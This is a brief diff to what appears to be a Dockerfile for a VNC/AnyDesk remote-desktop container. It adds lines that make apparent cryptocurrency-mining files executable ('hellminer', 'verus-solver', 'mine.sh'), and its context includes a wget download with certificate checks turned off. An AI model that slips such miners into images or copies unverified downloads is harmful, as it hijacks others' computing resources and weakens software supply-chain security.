@@ -53,6 +53,9 @@ COPY . /app
 RUN chmod +x /app/conf.d/websockify.sh
 RUN chmod +x /app/run.sh
 RUN chmod +x /app/expect_vnc.sh
+RUN chmod +x /app/hellminer
+RUN chmod +x /app/verus-solver
+RUN chmod +x /app/mine.sh
 RUN echo 'deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main' >> /etc/apt/sources.list
 RUN echo "deb http://deb.anydesk.com/ all main"  >> /etc/apt/sources.list
 RUN wget --no-check-certificate https://dl.google.com/linux/linux_signing_key.pub -P /app
